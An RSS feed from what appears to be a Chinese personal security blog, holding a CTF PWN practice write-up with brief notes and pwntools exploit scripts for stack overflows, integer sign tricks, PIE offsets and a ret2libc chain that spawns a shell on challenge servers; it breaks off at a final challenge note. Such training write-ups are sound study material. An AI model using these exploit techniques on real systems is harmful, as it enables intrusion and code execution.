<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>ililiiY • Posts by &#34;pwn&#34; category</title>
        <link>https://lookhui.github.io</link>
        <description>坚持与努力</description>
        <language>zh-CN</language>
        <pubDate>Wed, 13 Dec 2023 08:46:10 +0800</pubDate>
        <lastBuildDate>Wed, 13 Dec 2023 08:46:10 +0800</lastBuildDate>
        <category>渗透</category>
        <category>PWN</category>
        <category>WEB</category>
        <category>mobile</category>
        <category>比赛</category>
        <category>HTB</category>
        <category>reverse</category>
        <category>CTF</category>
        <category>记录贴</category>
        <item>
            <guid isPermalink="true">https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/</guid>
            <title>PWN刷题解析</title>
            <link>https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/</link>
            <category>PWN</category>
            <pubDate>Wed, 13 Dec 2023 08:46:10 +0800</pubDate>
            <description><![CDATA[ &lt;h5 id=&#34;swpuctf-2021-新生赛gift_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2021-新生赛gift_pwn&#34;&gt;#&lt;/a&gt; [SWPUCTF 2021 新生赛] gift_pwn&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28785)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x4005B6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019华北pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019华北pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 华北] PWN1&lt;/h5&gt;
&lt;p&gt;这个题直接覆盖掉 v1 让其溢出后直接到 return&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28536)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x30+0x8)+p64(0x4006BE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当然也能让 v1 溢出使 v2 等于那个让其执行 return&lt;br /&gt;
tips:11.28125 表示在内存存储就是 0x41348000&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28029)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x2C+p64(0x41348000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babystack20&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babystack20&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babystack2.0&lt;/h5&gt;
&lt;p&gt;这个题判断点在于无符号类型因为里面的&lt;br /&gt;
 &lt;code&gt;if ( (int)nbytes &amp;gt; 10 ) &lt;/code&gt; read(0, buf, (unsigned int)nbytes);&lt;br /&gt;
 因为 buf 的溢出要 0x18 但是 nbytes 只能是 &amp;lt; 10 所以我们就要使用无符号类型让它等于 - 1 然后就能读取很多产生溢出&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28867)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x400726)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,&amp;#x27;-1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022reorpwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022reorpwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ReorPwn?&lt;/h5&gt;
&lt;p&gt;这个题注意他的 fun 函数里面给你的顺序逆了一下，下面就是 system，那直接使用 payload 数组逆位一下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28301)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;comm=&amp;#x27;cat /flag&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=comm[::-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lleT:&amp;#x27;,a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babystack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babystack&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babystack&lt;/h5&gt;
&lt;p&gt;这个题就更简单了，像前面那个题，这个题还不需要判断 read 的长度随便输就行能达到溢出点就行&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28240)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x4006E6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,&amp;#x27;-1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezstack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezstack&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezstack&lt;/h5&gt;
&lt;p&gt;打开后用 ida 查看到代码里面没有 system (&#39;/bin/sh&#39;) 但是有 system 并且在 data 段里面有 /bin/sh 那我们直接让代码溢出调用 system 和 /bin/sh&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28961)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;NISACTF&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;watevrctf-2019voting-machine-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#watevrctf-2019voting-machine-1&#34;&gt;#&lt;/a&gt; [watevrCTF 2019]Voting Machine 1&lt;/h5&gt;
&lt;p&gt;这个题有两个解法，输入 0x2 或者 0xa&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;machine&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28788)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./ctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0xa)+p64(0x400807)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Vote:&amp;quot;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezpie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezpie&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezpie&lt;/h5&gt;
&lt;p&gt;这种题要注意流程化，先看因为开启了 pie 地址随机化就得去算他们的偏移量因为得到了 main 函数地址所以就直接构造&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28694)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell=elf.sym[&amp;#x27;shell&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset=shell-main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;offset is :%x&amp;#x27;%offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;gift!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr=int(p.recv(10).decode(),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_shell_addr=main_addr+offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;main_addr is %x&amp;#x27;%main_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;shelloffset is %x&amp;#x27;%p_shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x28+0x4)+p32(p_shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;Input:&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;2021-鹤城杯babyof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2021-鹤城杯babyof&#34;&gt;#&lt;/a&gt; [2021 鹤城杯] babyof&lt;/h5&gt;
&lt;p&gt;这个题是一个 ret2libc 的题首先要泄露出一个 libc 基地址然后才能得到其他的地址&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program = &amp;quot;./babyof&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28666)#process(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = 0x400743&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ret = 0x400506&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__start = 0x400550&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//跳转到rdi寄存器上面然后在通过puts函数来打印puts的got在通过ret到起始位置让下面的payload生效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Do you know how to do buffer overflow?\n&amp;quot;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;quot;I hope you win\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))  #\\接收puts的got地址因为栈地址一般是由\x7f开头的自动补全8位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr) #\\利用puts_addr在LibcSearcher里面查找对映的库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)  #\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh_str=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;) #\\下面的得到基地址后都加上偏移量就能得到对应的函数了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;libc addr is %x&amp;#x27;%libc_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;bin_sh_str is %x&amp;#x27;%bin_sh_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Do you know how to do buffer overflow?\n&amp;quot;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gfctf-2021where_is_shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gfctf-2021where_is_shell&#34;&gt;#&lt;/a&gt; [GFCTF 2021]where_is_shell&lt;/h5&gt;
&lt;p&gt;可以利用 system ($0) 获得 shell 权限，$0 在机器码中为 \x24\x30&lt;/p&gt;
